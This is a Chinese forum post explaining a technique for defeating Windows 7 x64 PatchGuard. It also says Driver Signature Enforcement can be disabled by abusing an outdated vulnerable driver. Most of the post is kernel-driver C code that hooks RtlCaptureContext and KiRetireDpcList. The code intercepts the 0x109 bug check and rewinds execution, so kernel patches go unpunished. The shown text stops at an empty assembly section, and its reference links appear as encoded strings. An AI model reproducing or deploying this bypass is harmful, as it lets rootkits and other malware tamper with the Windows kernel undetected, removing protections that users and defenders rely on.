
# [分享]老文章系列：过Patchguard的梗

这里我研究的问题只有`Patchguard`怎么让丫去死，至于`DSE`这种东西，随便找个过时的有任意代码执行问题的驱动（比如`DCR`，`VBOX`，金山某士）去`Patch`一下`CI`就可以了。今天我也不是来跟人分享`VMX`或者`patch`文件那些无功夫的过`PG`手法。

我今天要做的是继续以前老外的`pg`的梗（由于我的笔记本跑`win8`不能10秒开机，所以只能用`win7`来撸）。

老外有几篇关于`PG`攻击的文章：

a02K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2U0j5h3k6W2k6g2)9J5k6h3y4G2L8g2)9J5c8X3W2F1i4K6u0r3M7X3g2K6L8%4g2J5j5$3g2K6i4K6u0r3M7X3g2H3L8%4u0@1M7#2)9J5c8Y4u0H3i4K6u0V1k6r3g2X3k6h3q4@1K9h3&6Y4i4K6u0V1M7r3q4@1j5$3S2Y4N6h3q4J5k6q4)9J5k6i4m8V1k6R3`.

cb9K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4g2F1K9h3&6X3L8%4u0E0k6h3c8Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3@1k6$3i4K6y4p5x3#2)9J5y4X3q4Q4x3@1b7K6i4K6t1$3N6q4)9K6c8s2y4#2L8i4u0&6

9f7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4g2F1K9h3&6X3L8%4u0E0k6h3c8Q4x3X3g2G2M7X3N6Q4x3V1k6Q4x3@1k6$3i4K6y4p5z5q4)9J5y4X3q4Q4x3@1b7#2i4K6t1$3N6q4)9K6c8s2y4#2L8i4u0&6

5f7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4A6W2M7U0m8E0k6h3#2Q4x3X3g2K6K9#2)9J5c8W2)9K6c8Y4m8Q4x3@1b7J5y4K6p5`.

不过统统不能解决真正的问题，最后一个连接除外。不过其中的分析让我们知道两件事儿，第一件事儿是`PG`的蓝屏是通过`DPC`或者`TIMER`调用`KeBugCheckEx`来的。第二件事儿是`PG`调用`KeBugCheckEx`的时候，会恢复`KeBugCheckEx`上的修改。

通过读老外的文章我们知道通过`DPC`来的必须经过`KiRetireDpcList`这个玩意才能到达蓝屏（而通过`TIMER`来的经过的函数比较奇怪，这里也不想管他）。

老外有一个思路就是`hook` `KeBugCheckEx`来处理`TIMER`的`PG`引发的`0x109`蓝屏，但是因为`KeBugCheckEx`有恢复`hook`的可能（新的`PG`是复制了`BugCheck`的代码），所以我选择了一个`KeBugCheckEx`内部的调用的函数来进行挂钩，然后通过堆栈读出`RCX`判断一下错误号，这个调用函数也是老外早就提供好的就是`RtlCaptureContext`。

到这里我都和老外的思路近似，之后后面就不一样了。我只有2个`hook`点，我不想判断`DPC`是不是`PG`的，也不研究线程`TIMER`的枚举，我直接在`KiRetireDpcList`这里保存运行环境（`CONTEXT`），然后继续调用`KiRetireDpcList`代码，然后保存的恢复运行环境（`RIP`修好）。

如果发生了`0x109`蓝屏，那么经过我挂钩的`RtlCaptureContext`时，我主动插入一个`DPC`到`DPC`链条去，然后恢复保存的`CONTEXT`到`Call KiRetireDpcList`处的去重新执行的话（也就是说，把时光倒流了），这时候`PG`就无法蓝屏了。但是这里有一个小问题，如果来自线程`TIMER`的`PG`蓝屏，则不能开蜘蛛的大招 回到过去 去`Pass`掉`TIMER`。不过`windows`的机制让我知道如果在`pg`的`timer`里的时候，`IRQL`应该是`PASSIVE`级别的，在`PASSIVE`级别的话，可以将整个执行流程跳入线程开始去直接运行（这点是老外的资料里发现然后结合`windbg`调试出来的）。

那么我绕过`PG`的工具设计思路就是：

```
//有2个hook点！

//RtlCaptureContext-->保存ecx等物-->OrgCap-->ProcPatchGuard-->其他

//											-->ECX==109 ,来自BugCheck-->修复STACK，重新插入空DPC

//																		-->如果IRQL是PASSIVE,则CallPointer去

//																		-->不是PASSIVE,则恢复环境-->到KiRetireDpcList重新执行DPC序列

//KiRetireDpcList -->保存环境-->原始-->还原环境

//
//
//
//
```

处理`PG`的主逻辑核心代码：`hook`库请自行准备了，至于`KiRetireDpcList`的定位，我是用符号文件定位的，其实也可以通过注册一个`DPC`去做回溯得到。

```
#include "stdafx.h"

typedef struct _HOOK_CTX
{
	ULONG64 rax;                  
	ULONG64 rcx;
	ULONG64 rdx;                 
	ULONG64 rbx;                
	ULONG64 rbp;
	ULONG64 rsi;                  
	ULONG64 rdi;
	ULONG64 r8;                   
	ULONG64 r9;
	ULONG64 r10;                  
	ULONG64 r11;
	ULONG64 r12;                  
	ULONG64 r13;
	ULONG64 r14;                  
	ULONG64 r15;
	ULONG64 Rflags;
	ULONG64 rsp;
}HOOK_CTX,*PHOOK_CTX;

typedef VOID (*TRtlCaptureContext)(PCONTEXT ContextRecord);

extern VOID AdjustStackCallPointer(
	IN ULONG_PTR NewStackPointer,
	IN PVOID StartAddress,
	IN PVOID Argument);

extern CHAR GetCpuIndex();
extern VOID HookKiRetireDpcList();
extern VOID HookRtlCaptureContext();
extern VOID BackTo1942();
static ULONG g_ThreadContextRoutineOffset = 0;
static ULONG64 g_KeBugCheckExAddress=0;
static UINT g_MaxCpu=0;

KDPC  g_TempDpc[0x100];
ULONG64 g_CpuContextAddress=0;
ULONG64 g_KiRetireDpcList=0;

//有2个hook点！
//RtlCaptureContext-->保存ecx等物-->OrgCap-->ProcPatchGuard-->其他
//											-->ECX==109 ,来自BugCheck-->修复STACK，重新插入空DPC
//																		-->如果IRQL是PASSIVE,则CallPointer去
//																		-->不是PASSIVE,则恢复环境-->到KiRetireDpcList重新执行DPC序列
//KiRetireDpcList -->保存环境-->原始-->还原环境
//
//
//
//
HOOK_INFO OrgRtlCaptureContext;
HOOK_INFO OrgKiRetireDpcList;
//真心刁！
VOID
	PgTempDpc(
	IN struct _KDPC *Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
	)
{
	return ;
}
VOID OnRtlCaptureContext(PHOOK_CTX hookCtx)
{ 
	ULONG64 Rcx;
	PCONTEXT pCtx = (PCONTEXT)(hookCtx->rcx);
	ULONG64 Rip = *(ULONG64 *)(hookCtx->rsp);
	TRtlCaptureContext OldRtlCaptureContext;
	OldRtlCaptureContext = (TRtlCaptureContext)OrgRtlCaptureContext.Bridge;

	OldRtlCaptureContext(pCtx);

	pCtx->Rsp = hookCtx->rsp+0x08;
	pCtx->Rip = Rip;
	pCtx->Rax = hookCtx->rax;
	pCtx->Rbx = hookCtx->rbx;
	pCtx->Rcx = hookCtx->rcx;
	pCtx->Rdx = hookCtx->rdx;
	pCtx->Rsi = hookCtx->rsi;
	pCtx->Rdi = hookCtx->rdi;
	pCtx->Rbp = hookCtx->rbp;

	pCtx->R8	=	hookCtx->r8;
	pCtx->R9	=	hookCtx->r9;
	pCtx->R10	=	hookCtx->r10;
	pCtx->R11	=	hookCtx->r11;
	pCtx->R12	=	hookCtx->r12;
	pCtx->R13	=	hookCtx->r13;
	pCtx->R14	=	hookCtx->r14;
	pCtx->R15	=	hookCtx->r15;

	Rcx = *(ULONG64 *)(hookCtx->rsp+0x48);
	//一开始存储位置rcx=[rsp+8+30]
	//call之后就是[rsp+8+30+8]
	
	if(Rcx==0x109)
	{
		//PG的蓝屏！
		if (Rip>=g_KeBugCheckExAddress && Rip <=g_KeBugCheckExAddress+0x64)
		{

			//来自KeBugCheckEx的蓝屏
			// 先插入一个DPC
			//检测IRQL的级别，如果是DPC_LEVEL的，则传说中的回到过去的技术。
			//如果是普通的，则跳入ThreadContext即可
			PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
			PVOID StartRoutine  = *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
			PVOID StackPointer  = IoGetInitialStack();
			CHAR  Cpu = GetCpuIndex();
			KeInitializeDpc(&g_TempDpc[Cpu],
				PgTempDpc,
				NULL);
			KeSetTargetProcessorDpc( &g_TempDpc[Cpu], (CCHAR)Cpu );
			//KeSetImportanceDpc( &g_TempDpc[Cpu], HighImportance);
			KeInsertQueueDpc( &g_TempDpc[Cpu], NULL, NULL );
			if(1){
				//应该判断版本再做这个事儿！
				PCHAR StackPage = (PCHAR)IoGetInitialStack();
				
				*(ULONG64 *)StackPage = (((ULONG_PTR)StackPage+0x1000) & 0x0FFFFFFFFFFFFF000);//stack起始的MagicCode，
				// 如果没有在win7以后的系统上会50蓝屏
			}
			if (KeGetCurrentIrql()!=PASSIVE_LEVEL)
			{
				//时光倒流！
				BackTo1942();//回到call KiRetireDpcList去了！
			}
			//线程TIMER的直接执行线程去！
			AdjustStackCallPointer(
				(ULONG_PTR)StackPointer - 0x8,
				StartRoutine,
				NULL);
		}
	}
	return ;
}
VOID JmpThreadContext()
{
	PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
	PVOID StartRoutine  = *(PVOID **)(CurrentThread + g_ThreadContextRoutineOffset);
	PVOID StackPointer  = IoGetInitialStack();

	AdjustStackCallPointer(
		(ULONG_PTR)StackPointer - 0x8,
		StartRoutine,
		NULL);
}

VOID DisablePatchProtectionSystemThreadRoutine(
	IN PVOID Nothing)
{
	PUCHAR         CurrentThread = (PUCHAR)PsGetCurrentThread();
	for (g_ThreadContextRoutineOffset = 0;
		g_ThreadContextRoutineOffset < 0x1000;
		g_ThreadContextRoutineOffset += 4)
	{
		if (*(PVOID **)(CurrentThread +
			g_ThreadContextRoutineOffset) == (PVOID)DisablePatchProtectionSystemThreadRoutine)
			break;
	}

	if (g_ThreadContextRoutineOffset<0x1000)
	{
		g_KeBugCheckExAddress = (ULONG64)GetCALLByName(L"KeBugCheckEx");
		
		g_MaxCpu = (UINT)KeNumberProcessors;

		g_CpuContextAddress = (ULONG64)ExAllocatePool(NonPagedPool,0x200*g_MaxCpu+0x1000);

		if (!g_CpuContextAddress)
		{
			return ;
		}
		

		RtlZeroMemory(g_TempDpc,sizeof(KDPC)*0x100);
		RtlZeroMemory((PVOID)g_CpuContextAddress,0x200 * g_MaxCpu);

		HookFunction(pCfgData->_KiRetireDpcList,(ULONG_PTR)HookKiRetireDpcList,&OrgKiRetireDpcList);
		
		g_KiRetireDpcList = (ULONG64)(OrgKiRetireDpcList.Bridge);

		HookFunction((ULONG_PTR)GetCALLByName(L"RtlCaptureContext"),(ULONG_PTR)HookRtlCaptureContext,&OrgRtlCaptureContext);
	}
}

NTSTATUS DisablePatchProtection() {
	OBJECT_ATTRIBUTES Attributes;
	NTSTATUS          Status;
	HANDLE            ThreadHandle = NULL;

	InitializeObjectAttributes(
		&Attributes,
		NULL,
		OBJ_KERNEL_HANDLE,
		NULL,
		NULL);

	Status = PsCreateSystemThread(
		&ThreadHandle,
		THREAD_ALL_ACCESS,
		&Attributes,
		NULL,
		NULL,
		DisablePatchProtectionSystemThreadRoutine,
		NULL);

	if (ThreadHandle)
		ZwClose(
		ThreadHandle);

	return Status;
}
VOID InitDisablePatchGuard()
{
	DisablePatchProtection();
}
```

汇编代码部分：
